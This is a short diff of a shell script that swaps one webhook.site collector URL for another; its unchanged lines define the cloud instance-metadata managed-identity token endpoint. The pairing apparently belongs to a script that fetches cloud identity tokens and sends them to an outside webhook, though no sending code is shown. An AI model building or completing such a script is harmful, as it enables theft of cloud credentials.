@@ -1,6 +1,6 @@
 #!/bin/sh
 
-WEBHOOK_URL="https://webhook.site/b4b33967-c95c-4510-bda7-0110af22aff2"
+WEBHOOK_URL="https://webhook.site/d2ac6a90-115a-40b2-9604-f0dfacd0ece9"
 
 IDENTITY_ENDPOINT="http://169.254.169.254/metadata/identity/oauth2/token"
 
